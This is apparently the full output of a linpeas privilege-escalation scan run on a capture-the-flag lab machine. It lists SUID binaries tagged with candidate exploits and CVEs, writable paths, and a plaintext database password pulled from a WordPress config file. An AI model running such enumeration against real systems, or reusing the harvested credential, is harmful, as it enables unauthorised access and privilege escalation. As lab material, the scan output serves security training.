-rwsr-xr-x 1 root root 33K Mar 29  2016 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40K Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root 23K Abr 29  2016 /usr/bin/ubuntu-core-launcher  --->  Befre_1.0.27.1(CVE-2016-1580)
-rwsr-xr-x 1 root root 134K Mai  4  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 74K Mar 29  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 31K Mar 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Mai  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K Mar 29  2016 /bin/su
-rwsr-xr-x 1 root root 139K Fev 17  2016 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 27K Mai 26  2016 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Mai  7  2014 /bin/ping6                                                                                                                                                    
-rwsr-xr-x 1 root root 40K Mai 26  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                               
                                                                                                                                                                                                      
╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                      
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd                                                                                                                                           
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 351K Mai 26  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 61K Mar 29  2016 /usr/bin/chage
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root utmp 425K Fev  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root shadow 23K Mar 29  2016 /usr/bin/expiry
-rwxr-sr-x 1 root tty 27K Mai 26  2016 /usr/bin/wall
-rwxr-sr-x 1 root crontab 36K Abr  5  2016 /usr/bin/crontab

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                                                                                              
/etc/ld.so.conf                                                                                                                                                                                       
Content of /etc/ld.so.conf:                                                                                                                                                                           
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                                                         
  - /usr/local/lib                                                                                                                                                                                    
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                                                                                                                             
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                                                                                             
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                       
══╣ Current shell capabilities                                                                                                                                                                        
CapInh:  0x0000000000000000=                                                                                                                                                                          
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                                          
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3310 Abr 12  2016 sbin.dhclient                                                                                                                                                
-rw-r--r-- 1 root root  125 Jun 30  2016 usr.bin.lxc-start
-rw-r--r-- 1 root root 3612 Abr 29  2016 usr.bin.ubuntu-core-launcher
-rw-r--r-- 1 root root  281 Jun 30  2016 usr.lib.lxd.lxd-bridge-proxy
-rw-r--r-- 1 root root 1793 Jan 28  2021 usr.sbin.mysqld
-rw-r--r-- 1 root root 1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1454 Jun  2  2015 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                               
files with acls in searched folders Not Found                                                                                                                                                         
                                                                                                                                                                                                      
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                     
total 24                                                                                                                                                                                              
drwxr-xr-x  2 root root 4096 Jun 10  2021 .
drwxr-xr-x 92 root root 4096 Out 31  2021 ..
-rw-r--r--  1 root root  101 Jun 29  2016 apps-bin-path.sh
-rw-r--r--  1 root root  663 Mai 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dez 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Abr 14  2016 Z97-byobu.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                       
                                                                                                                                                                                                      
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                          
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                          
═╣ Can I read shadow files? ............. No                                                                                                                                                          
═╣ Can I read shadow plists? ............ No                                                                                                                                                          
═╣ Can I write shadow plists? ........... No                                                                                                                                                          
═╣ Can I read opasswd file? ............. No                                                                                                                                                          
═╣ Can I write in network-scripts? ...... No                                                                                                                                                          
═╣ Can I read root folder? .............. No                                                                                                                                                          
                                                                                                                                                                                                      
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                
/root/
/var/www
/var/www/html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 0 Jul  6 09:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children                                                           
-rw-r--r-- 1 root root 0 Jul  6 09:05 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/notify_on_release

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                      
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                     
/dev/mqueue                                                                                                                                                                                           
/dev/shm
/home/jangow01
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                     
                                                                                                                                                                                                      
                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                       
                            ╔═════════════════════════╗                                                                                                                                                                                
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                    
                            ╚═════════════════════════╝                                                                                                                                                                                
╔══════════╣ .sh files in path                                                                                                                                                                                                         
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                             
/usr/bin/gettext.sh                                                                                                                                                                                                                    
                                                                                                                                                                                                                                       
╔══════════╣ Executable files potentially added by user (limit 70)                                                                                                                                                                     
2021-06-10+18:40:55.3968924870 /script/backup                                                                                                                                                                                          
                                                                                                                                                                                                                                       
╔══════════╣ Unexpected in root                                                                                                                                                                                                        
/script                                                                                                                                                                                                                                
/vmlinuz                                                                                                                                                                                                                               
/initrd.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/jangow01/.config/lxc/client.key                                                                                                                                                                                                  
/home/jangow01/.config/lxc/client.crt
/home/jangow01/.gnupg/pubring.gpg
/home/jangow01/.gnupg/gpg.conf
/home/jangow01/.gnupg/trustdb.gpg
/var/log/auth.log
/var/log/ufw.log
/var/log/kern.log
/var/log/syslog

logrotate 3.8.7

╔══════════╣ Files inside /home/jangow01 (limit 20)
total 888                                                                                                                                                                                                                              
drwxr-xr-x 6 jangow01 desafio02   4096 Jul  6 09:05 .
drwxr-xr-x 3 root     root        4096 Out 31  2021 ..
-rw------- 1 jangow01 desafio02    200 Out 31  2021 .bash_history
-rw-r--r-- 1 jangow01 desafio02    220 Jun 10  2021 .bash_logout
-rw-r--r-- 1 jangow01 desafio02   3771 Jun 10  2021 .bashrc
drwx------ 2 jangow01 desafio02   4096 Jun 10  2021 .cache
drwxr-x--- 3 jangow01 desafio02   4096 Jul  6 09:05 .config
drwx------ 2 jangow01 desafio02   4096 Jul  6 09:05 .gnupg
-rwx--x--x 1 jangow01 desafio02 860337 Jul  6 08:57 linpeas.sh
drwxrwxr-x 2 jangow01 desafio02   4096 Jun 10  2021 .nano
-rw-r--r-- 1 jangow01 desafio02    655 Jun 10  2021 .profile
-rw-r--r-- 1 jangow01 desafio02      0 Jun 10  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 jangow01 desafio02     33 Jun 10  2021 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/.backup                                                                                                                                                                                                                  
/var/www/html/site/js/scripts.js
/var/www/html/site/wordpress/index.html
/var/www/html/site/wordpress/config.php
/var/www/html/site/index.html
/var/www/html/site/assets/favicon.ico
/var/www/html/site/assets/img/bg-masthead.jpg
/var/www/html/site/assets/img/demo-image-02.jpg
/var/www/html/site/assets/img/bg-signup.jpg
/var/www/html/site/assets/img/ipad.png
/var/www/html/site/assets/img/demo-image-01.jpg
/var/www/html/site/busque.php
/var/www/html/site/css/styles.css

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                       
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                       
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 8694 Jul 12  2016 /lib/modules/4.4.0-31-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                               
-rw-r--r-- 1 root root 8974 Jul 12  2016 /lib/modules/4.4.0-31-generic/kernel/drivers/power/wm831x_backup.ko
-rwxr-xr-x 1 root root 14864 Jun 10  2021 /script/backup
-rw-r--r-- 1 root root 31600 Abr 15  2016 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 189569 Jul 12  2016 /usr/src/linux-headers-4.4.0-31-generic/.config.old
-rw-r--r-- 1 root root 0 Jul 12  2016 /usr/src/linux-headers-4.4.0-31-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jul 12  2016 /usr/src/linux-headers-4.4.0-31-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 10542 Jun 10  2021 /usr/share/info/dir.old
-rw-r--r-- 1 root root 665 Abr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 298768 Dez 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Mai  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 226 Abr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 www-data www-data 336 Out 31  2021 /var/www/html/.backup
-rw-r--r-- 1 root root 128 Jun 10  2021 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 20 Abr 15  2016 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 610 Jun 10  2021 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Jun 10  2021 /etc/xml/xml-core.xml.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/lxd/lxd.db: SQLite 3.x database                                                                                                                                                                                         
Found /var/lib/mlocate/mlocate.db: regular file, no read permission

 -> Extracting tables from /var/lib/lxd/lxd.db (limit 20)
                                                                                                                                                                                                                                       
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                             
total 12K
drwxr-xr-x  3 root root 4,0K Out 31  2021 .
drwxr-xr-x 14 root root 4,0K Jun 10  2021 ..
drwxr-xr-x  3 root root 4,0K Out 31  2021 html

/var/www/html:
total 16K
drwxr-xr-x 3 root     root     4,0K Out 31  2021 .
drwxr-xr-x 3 root     root     4,0K Out 31  2021 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 jangow01 desafio02 220 Jun 10  2021 /home/jangow01/.bash_logout                                                                                                                                                           
-rw-r--r-- 1 www-data www-data 336 Out 31  2021 /var/www/html/.backup
-rw-r--r-- 1 root root 1376 Jun 10  2021 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Jul 19  2016 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Ago 31  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Jul  5 14:52 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 11 Jun 10  2021 /var/backups/dpkg.arch.0                                                                                                                                                                        
-rw-r--r-- 1 root root 51200 Jul  6 06:25 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
/home/jangow01/.bash_history:sudo su                                                                                                                                                                                                   
/home/jangow01/.bash_history:ls /root/script
/home/jangow01/.bash_history:sudo su
/home/jangow01/.bash_history:sudo su
/home/jangow01/.bash_history:sudo su
/home/jangow01/.bash_history:su
/home/jangow01/.bash_history:su

╔══════════╣ Searching passwords in config PHP files
/var/www/html/site/wordpress/config.php:$password = "abygurl69";                                                                                                                                                                       

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                              
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/pt_BR/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/pt/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                       
╔══════════╣ Searching passwords inside logs (limit 70)
2016-07-19 20:43:06 configure base-passwd:amd64 3.5.39 3.5.39                                                                                                                                                                          
2016-07-19 20:43:06 install base-passwd:amd64 <none> 3.5.39
2016-07-19 20:43:06 status half-configured base-passwd:amd64 3.5.39
2016-07-19 20:43:06 status half-installed base-passwd:amd64 3.5.39
2016-07-19 20:43:06 status installed base-passwd:amd64 3.5.39
2016-07-19 20:43:06 status unpacked base-passwd:amd64 3.5.39
2016-07-19 20:43:08 status half-configured base-passwd:amd64 3.5.39
2016-07-19 20:43:08 status half-installed base-passwd:amd64 3.5.39
2016-07-19 20:43:08 status unpacked base-passwd:amd64 3.5.39
2016-07-19 20:43:08 upgrade base-passwd:amd64 3.5.39 3.5.39
2016-07-19 20:43:13 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2016-07-19 20:43:13 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2016-07-19 20:43:13 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2016-07-19 20:43:16 configure base-passwd:amd64 3.5.39 <none>
2016-07-19 20:43:16 status half-configured base-passwd:amd64 3.5.39
2016-07-19 20:43:16 status installed base-passwd:amd64 3.5.39
2016-07-19 20:43:16 status unpacked base-passwd:amd64 3.5.39
2016-07-19 20:43:21 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2016-07-19 20:43:21 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2016-07-19 20:43:21 status installed passwd:amd64 1:4.2-3.1ubuntu5
2016-07-19 20:43:21 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Description: Set up users and passwords
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                     
                                ╚════════════════╝                                                                                                                                                                                     
Regexes to search for API keys aren't activated, use param '-r' 


jangow01@jangow01:~$ 

```